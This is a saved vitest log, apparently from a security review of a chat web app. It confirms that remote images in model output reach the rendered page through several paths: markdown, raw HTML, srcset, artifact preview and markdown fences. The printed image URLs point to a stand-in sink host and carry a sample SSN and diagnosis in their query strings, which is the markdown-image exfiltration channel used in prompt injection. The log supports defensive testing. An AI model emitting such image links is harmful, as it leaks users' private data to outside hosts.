@@ -1,0 +1,51 @@
+
+ RUN  v4.1.10 /root/tinfoil-review/work/verify/webapp-render-xss--markdown-remote-image-exfil--code/tinfoil-webapp
+
+stderr | tests/verify/remote-image-exfil.verify.test.tsx
+Warning: KaTeX doesn't work in quirks mode. Make sure your website has a suitable doctype.
+
+stdout | tests/verify/remote-image-exfil.verify.test.tsx > verify: remote images from model output reach the DOM > MessageContent with the production plugin set
+[verify] MessageContent img src: [
+  'https://verifier-sink.invalid/a.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=md',
+  'https://verifier-sink.invalid/b.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=raw',
+  'https://verifier-sink.invalid/d.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=pic',
+  'http://verifier-sink.invalid/e.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=http',
+  ''
+]
+[verify] MessageContent source srcset: [
+  'https://verifier-sink.invalid/c.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=srcset 1x'
+]
+
+stdout | tests/verify/remote-image-exfil.verify.test.tsx > verify: remote images from model output reach the DOM > StreamingChunkedText (the path DefaultMessageRenderer uses) after streaming ends
+[verify] StreamingChunkedText img src: [
+  'https://verifier-sink.invalid/a.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=md',
+  'https://verifier-sink.invalid/b.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=raw',
+  'https://verifier-sink.invalid/d.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=pic',
+  'http://verifier-sink.invalid/e.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=http',
+  ''
+]
+
+stdout | tests/verify/remote-image-exfil.verify.test.tsx > verify: remote images from model output reach the DOM > render_artifact_preview markdown source (bare ReactMarkdown)
+[verify] artifact img src: [
+  'https://verifier-sink.invalid/f.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=artifact'
+]
+
+stdout | tests/verify/remote-image-exfil.verify.test.tsx > verify: remote images from model output reach the DOM > ```markdown fence: preview auto-selected when not streaming
+[verify] code-fence preview img src: [
+  'https://verifier-sink.invalid/h.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=fence'
+]
+
+ ✓ tests/verify/remote-image-exfil.verify.test.tsx > verify: remote images from model output reach the DOM > MessageContent with the production plugin set 72ms
+ ✓ tests/verify/remote-image-exfil.verify.test.tsx > verify: remote images from model output reach the DOM > StreamingChunkedText (the path DefaultMessageRenderer uses) after streaming ends 16ms
+ ✓ tests/verify/remote-image-exfil.verify.test.tsx > verify: remote images from model output reach the DOM > render_artifact_preview markdown source (bare ReactMarkdown) 10ms
+stdout | tests/verify/remote-image-exfil.verify.test.tsx > verify: remote images from model output reach the DOM > ```markdown fence: while streaming, no preview (negative control)
+[verify] code-fence (streaming) img src: []
+
+ ✓ tests/verify/remote-image-exfil.verify.test.tsx > verify: remote images from model output reach the DOM > ```markdown fence: preview auto-selected when not streaming 12ms
+ ✓ tests/verify/remote-image-exfil.verify.test.tsx > verify: remote images from model output reach the DOM > ```markdown fence: while streaming, no preview (negative control) 5ms
+
+ Test Files  1 passed (1)
+      Tests  5 passed (5)
+   Start at  01:23:33
+   Duration  1.91s (transform 311ms, setup 67ms, import 1.38s, tests 118ms, environment 216ms)
+
